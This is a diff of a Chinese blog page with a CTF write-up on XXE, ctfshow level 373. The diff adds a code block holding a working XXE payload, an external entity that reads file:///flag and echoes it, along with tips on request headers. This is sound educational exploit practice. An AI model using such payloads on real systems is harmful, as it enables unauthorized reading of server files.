@@ -412,14 +412,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-01-22
+                    2022-02-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    106
+                    128
                 </div>
                 
 
@@ -447,7 +447,16 @@
                 <p>[TOC]</p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-2">一篇文章带你深入理解漏洞之XXE</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/115091314">XML基础知识</a></p>
-<h2 id="373"><a href="#373" class="headerlink" title="373"></a>373</h2><p>很明显可以实体注入，而且是有回显的，所以要注意的是 <code>echo $creds-&gt;ctfshow</code>是<code>echo</code>出<code>ctfshow</code>这个元素，因此一定要用它来包裹实体<br>]&gt;<br><note><br>     <ctfshow><br>         &amp;test;<br>     </ctfshow><br></note></p>
+<h2 id="373"><a href="#373" class="headerlink" title="373"></a>373</h2><p>很明显可以实体注入，而且是有回显的，所以要注意的是 <code>echo $creds-&gt;ctfshow</code>是<code>echo</code>出<code>ctfshow</code>这个元素，因此一定要用它来包裹实体</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE note[
+   &lt;!ENTITY test SYSTEM "file:///flag"&gt;
+]&gt;
+&lt;note&gt;
+     &lt;ctfshow&gt;
+         &amp;test;
+     &lt;/ctfshow&gt;               
+&lt;/note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="/2022/01/22/ctfshow-xxe/image-20211127213543086.png" alt="image-20211127213543086"></p>
 <p>提示 :  抓包的请求头 Connection 要删除 或者 keep-alive<img src="C:\Users\86181\AppData\Roaming\Typora\typora-user-images\image-20211127214008110.png" alt="image-20211127214008110"></p>
 <p>xml文档区分大小写 以及变量别忘记加分号；</p>
